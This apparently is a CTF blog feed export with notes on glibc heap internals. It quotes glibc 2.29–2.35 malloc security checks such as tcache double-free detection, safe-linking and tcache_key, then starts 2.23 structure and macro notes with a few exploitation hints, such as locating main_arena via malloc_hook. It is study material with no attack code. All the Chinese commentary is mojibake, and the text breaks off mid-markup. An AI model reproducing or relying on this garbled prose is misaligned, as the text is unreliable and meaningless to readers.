ã€‚æ£€æŸ¥sizeå’Œnextchunkçš„presizeæ˜¯å¦ç›¸ç¬¦ï¼›å¤§å°æ˜¯å¦åˆæ³•ï¼›å‰åè¿æ¥æ˜¯å¦æ­£ç¡®ï¼›é€šè¿‡nextchunkçš„preinuseæ£€æŸ¥chunkæ˜¯å¦inuse<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = victim-&gt;bk;<br>size = chunksize (victim);<br>mchunkptr next = chunk_at_offset (victim, size);<br><br><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure></li><li>use_topä¸­æ£€æŸ¥top chunkå¤§å°æ˜¯å¦åˆæ³•<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br><br>  victim = av-&gt;top;<br>  size = chunksize (victim);<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure></li><li>_int_freeå¼€å¤´çš„tcacheæ“ä½œï¼Œå¢åŠ double freeçš„æ£€æŸ¥<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br><span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>tcache_entry *e = (tcache_entry *) chunk2mem (p);<br><br><span class="hljs-comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="hljs-comment">   trust it (it also matches random payload data at a 1 in</span><br><span class="hljs-comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="hljs-comment">   coincidence before aborting.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>    <span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">       few cycles, but don&#x27;t abort.  */</span><br>  &#125;<br><br><span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>  &#123;<br>    tcache_put (p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure></li><li>_int_freeçš„å‘ä¸‹åˆå¹¶æ“ä½œå¢åŠ sizeå’Œnextchunkçš„presizeçš„æ£€æŸ¥ï¼Œmalloc_consolidateåŒ<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  prevsize = prev_size (p);<br>  size += prevsize;<br>  p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-30"><a href="#2-30" class="headerlink" title="2.30"></a>2.30</h1><ul><li>checked_request2sizeå†æ¬¡æ›´æ–°<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">checked_request2size (<span class="hljs-type">size_t</span> req, <span class="hljs-type">size_t</span> *sz) __nonnull (<span class="hljs-number">1</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (req &gt; PTRDIFF_MAX))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  *sz = request2size (req);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>tcache_putå’Œtcache_getçš„æ–­è¨€å…¨éƒ¨åˆ é™¤</li><li>__libc_mallocä¸­ä»tcacheä¸­å–chunkæ—¶æŒ‰countså†³å®štcacheæ˜¯å¦éç©º<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>    &amp;&amp; tcache<br>    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>  &#125;<br></code></pre></td></tr></table></figure></li><li>_int_mallocä¸­å°†chunkæ”¾å…¥large binä¸­æ—¶å¢åŠ æ£€æŸ¥<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>  &#123;<br>    victim-&gt;fd_nextsize = fwd;<br>    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>      malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br>    fwd-&gt;bk_nextsize = victim;<br>    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>  &#125;<br>bck = fwd-&gt;bk;<br><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br><br></code></pre></td></tr></table></figure></li></ul><h1 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h1><p>æ— </p><h1 id="2-32"><a href="#2-32" class="headerlink" title="2.32"></a>2.32</h1><ul><li>å¢åŠ äº†å¯¹å•é“¾è¡¨çš„æŒ‡é’ˆä¿æŠ¤æœºåˆ¶safe-linkingï¼ˆfastbinå’Œtcacheï¼‰å’Œå¯¹ç”³è¯·åœ°å€çš„0x10å¯¹é½æ£€æŸ¥ï¼ˆé”™ä½æ‰¾0x7fæ‰“fastbinä¸è¡Œäº†&#x2F;(ã„’oã„’)&#x2F;~~ï¼‰<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  e-&gt;key = tcache;<br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br><span class="hljs-comment">//åŸfd^åœ°å€&gt;&gt;12</span><br><span class="hljs-comment">//e-&gt;next = tcache-&gt;entries[tc_idx];ï¼ˆ2.31æºç ï¼‰</span><br><br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br><span class="hljs-comment">//ä»tcacheä¸­å–chunkæ—¶çš„å¯¹é½æ£€æŸ¥ï¼Œä»fastbinä¸­å–chunkçš„å¯¹é½æ£€æŸ¥åŒç†</span><br><br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br><span class="hljs-comment">//ç°fd^åœ°å€&gt;&gt;12</span><br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-33"><a href="#2-33" class="headerlink" title="2.33"></a>2.33</h1><ul><li>å¢åŠ Memory taggingæœºåˆ¶ï¼Œæ²¡çœ‹æ‡‚ä½†å¥½åƒæ²¡å¤§é—®é¢˜ï¼ˆ</li><li>_int_freeçš„tcacheæ“ä½œå¢åŠ countè¶…æ ‡æ£€æŸ¥<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-type">size_t</span> cnt = <span class="hljs-number">0</span>;<br>   LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>   <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)<br>     &#123;<br><span class="hljs-keyword">if</span> (cnt &gt;= mp_.tcache_count)<br>  malloc_printerr (<span class="hljs-string">&quot;free(): too many chunks detected in tcache&quot;</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="2-34"><a href="#2-34" class="headerlink" title="2.34"></a>2.34</h1><ul><li>å¢åŠ tcache_keyæœºåˆ¶ï¼Œç”¨éšæœºæ•°ä»£æ›¿tcacheæ ‡è®°æ£€æŸ¥double free<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">uintptr_t</span> tcache_key;<br><br><span class="hljs-comment">/* The value of tcache_key does not really have to be a cryptographically</span><br><span class="hljs-comment">   secure random number.  It only needs to be arbitrary enough so that it does</span><br><span class="hljs-comment">   not collide with values present in applications.  If a collision does happen</span><br><span class="hljs-comment">   consistently enough, it could cause a degradation in performance since the</span><br><span class="hljs-comment">   entire list is checked to check if the block indeed has been freed the</span><br><span class="hljs-comment">   second time.  The odds of this happening are exceedingly low though, about 1</span><br><span class="hljs-comment">   in 2^wordsize.  There is probably a higher chance of the performance</span><br><span class="hljs-comment">   degradation being due to a double free where the first free happened in a</span><br><span class="hljs-comment">   different thread; that&#x27;s a case this check does not cover.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_key_initialize</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (__getrandom (&amp;tcache_key, <span class="hljs-keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)<br>      != <span class="hljs-keyword">sizeof</span> (tcache_key))<br>    &#123;<br>      tcache_key = random_bits ();<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> __WORDSIZE == 64</span><br>      tcache_key = (tcache_key &lt;&lt; <span class="hljs-number">32</span>) | random_bits ();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li>åˆ é™¤äº†æ‰€æœ‰çš„hookåŠå…¶ç›¸å…³å‡½æ•°å’Œåˆ©ç”¨&#x2F;(ã„’oã„’)&#x2F;~~</li></ul><h1 id="2-35"><a href="#2-35" class="headerlink" title="2.35"></a>2.35</h1><p>æ— </p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>source code</tag>
      
      <tag>ptmalloc2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.23å †ç›¸å…³æºç é˜…è¯»ç¬”è®°</title>
    <link href="/2023/01/20/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/01/20/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>åšhgame-week2çš„å †é¢˜æ—¶å‘ç°è‡ªå·±å¯¹äºå †çš„mallocå’Œfreeç›¸å…³æœºåˆ¶è¿˜æ²¡æœ‰å»ºç«‹ä¸€ä¸ªæ•´ä½“çš„ç»“æ„å°è±¡ï¼Œæ‰€ä»¥å†³å®šä»æºç é˜…è¯»å¼€å§‹å»ºæ„å…³äºå †çš„çŸ¥è¯†ä½“ç³»ã€‚<br>è¿™æ˜¯æˆ‘å‡æœŸå †å­¦ä¹ è®¡åˆ’çš„å¼€å§‹ï¼Œä¹Ÿæ˜¯åšå®¢å»ºç«‹åçš„ç¬¬ä¸€ç¯‡æ–‡ç« ï¼Œçºªå¿µä¸€ä¸‹ã€‚(à¸‡ â€¢_â€¢)à¸‡</p><span id="more"></span><h1 id="ç›¸å…³ç»“æ„ä½“"><a href="#ç›¸å…³ç»“æ„ä½“" class="headerlink" title="ç›¸å…³ç»“æ„ä½“"></a>ç›¸å…³ç»“æ„ä½“</h1><h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><p>malloc_chunkç»“æ„ä½“æºç ï¼ˆsizeåªæœ‰Må’ŒPæ ‡å¿—ä½ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ä½åœ°å€</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><span class="hljs-comment">//é«˜åœ°å€</span><br></code></pre></td></tr></table></figure><p>ç›¸å…³æ³¨é‡Šæ³¨æ„äº‹é¡¹ï¼š   </p><ul><li>chunkçš„sizeæˆå‘˜ã€ä¸‹ä¸€ä¸ªchunkçš„pre_sizeæˆå‘˜ä»¥åŠå®ƒä»¬çš„Pä½å†³å®šäº†free chunkçš„åˆå¹¶ï¼Œè¿™ä¸€ç‚¹åœ¨åç»­ç›¸å…³å‡½æ•°çš„æºç ä¸­ä¹Ÿæœ‰ä½“ç°</li><li>å †æŒ‡é’ˆå®é™…æŒ‡å‘chunkçš„sizeæˆå‘˜ï¼Œè¿”å›ç»™ç”¨æˆ·çš„æŒ‡é’ˆåˆ™æŒ‡å‘chunkçš„dataéƒ¨åˆ†ï¼Œå³fdæˆå‘˜</li><li>å †åœ°å€å¯¹å…¶0x10ï¼ˆæœ¬æ–‡æ‰€æœ‰ä¿è¯å…¼å®¹æ€§çš„æ“ä½œéƒ½ä»¥64ä½ç³»ç»Ÿä¸ºä¾‹ï¼‰ï¼Œå…·ä½“å¯¹é½æ–¹å¼è§åç»­ç›¸å…³å‡½æ•°</li><li>top chunkä»ä½åœ°å€å¼€å§‹åˆ‡åˆ†</li><li>å¦‚æœå‰©ä½™å †ç©ºé—´ä¸å¤Ÿåˆ†é…ï¼Œåˆ™å¯ç”¨mmap()è¿›è¡Œåˆ†é…ï¼ŒåŒæ—¶å°†åˆ†é…å‡ºæ¥çš„chunkçš„Mä½ç½®1</li></ul><h2 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h2><p>malloc_stateç»“æ„ä½“æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  <span class="hljs-type">mutex_t</span> mutex;<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br><br><span class="hljs-comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span><br><span class="hljs-comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span><br><span class="hljs-comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span><br><span class="hljs-comment">   before using. This malloc relies on the property that malloc_state</span><br><span class="hljs-comment">   is initialized to all zeroes (as is true of C statics).  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>æ³¨æ„äº‹é¡¹ï¼š   </p><ul><li>ä¸»çº¿ç¨‹çš„malloc_stateå³main_arenaä¿å­˜åœ¨libc.soçš„æ•°æ®æ®µä¸­</li><li>è¿è¡Œæ—¶malloc_arenaåœ¨malloc_hookä¸Šæ–¹ä¸è¿œå¤„ï¼Œå› æ­¤å¯ä»¥ç”¨malloc_hookå®šä½main_arena</li></ul><h1 id="ç›¸å…³å®å®šä¹‰"><a href="#ç›¸å…³å®å®šä¹‰" class="headerlink" title="ç›¸å…³å®å®šä¹‰"></a>ç›¸å…³å®å®šä¹‰</h1><h2 id="å¤§å°ã€å¯¹é½æ£€æŸ¥åŠè½¬åŒ–"><a href="#å¤§å°ã€å¯¹é½æ£€æŸ¥åŠè½¬åŒ–" class="headerlink" title="å¤§å°ã€å¯¹é½æ£€æŸ¥åŠè½¬åŒ–"></a>å¤§å°ã€å¯¹é½æ£€æŸ¥åŠè½¬åŒ–</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br><span class="hljs-comment">//å †åœ°å€å’Œç”¨æˆ·åœ°å€ç›¸éš”ä¸€ä¸ªsizeæˆå‘˜å’Œä¸€ä¸ªpre_sizeæˆå‘˜</span><br><br><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">//0x10å¯¹é½æ£€æŸ¥ï¼ŒMALLOC_ALIGNMENTæ˜¯mallocçš„æœ€å°å¯¹é½å‚æ•°(0x10)ï¼ŒMALLOC_ALIGN_MASKï¼ˆ0xfï¼‰</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MALLOC_ALIGNMENT</span><br><span class="hljs-meta"># <span class="hljs-keyword">if</span> !SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_16)</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span><br><span class="hljs-meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span 